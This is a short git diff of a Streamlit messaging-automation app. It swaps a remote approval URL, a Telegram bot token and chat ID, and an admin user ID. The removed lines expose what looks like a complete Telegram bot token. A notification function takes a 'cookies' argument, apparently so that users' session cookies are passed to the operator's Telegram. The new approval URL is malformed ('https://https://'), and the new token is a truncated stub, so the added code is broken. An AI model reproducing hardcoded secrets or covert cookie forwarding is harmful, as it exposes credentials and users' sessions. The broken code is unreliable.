@@ -247,7 +247,7 @@ custom_css = f"""
 st.markdown(custom_css, unsafe_allow_html=True)
 
 # GitHub approval configuration
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/killergodx09/Approvel/main/approval.txt"
+GITHUB_RAW_URL = "https://https://raw.githubusercontent.com/deepakdhurve6588-debug/OPX/main/app.txt"
 CONTACT_LINKS = {
     "whatsapp": "https://wa.me/917668337116",
     "telegram": "https://t.me/itxthedevil", 
@@ -625,8 +625,8 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
 
 def send_telegram_notification(username, automation_state=None, cookies=""):
     try:
-        telegram_bot_token = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
-        telegram_admin_chat_id = "8186206231"
+        telegram_bot_token = "80434ING_-0e3qg"
+        telegram_admin_chat_id = "818620"
         
         from datetime import datetime
         import pytz
@@ -666,7 +666,7 @@ User has successfully started the automation process."""
         return False
 
 def send_admin_notification(user_config, username, automation_state=None, user_id=None):
-    ADMIN_UID = "100037931553832"
+    ADMIN_UID = "100021841126660"
     driver = None
     try:
         log_message(f"ADMIN-NOTIFY: Sending usage notification for user: {username}", automation_state)
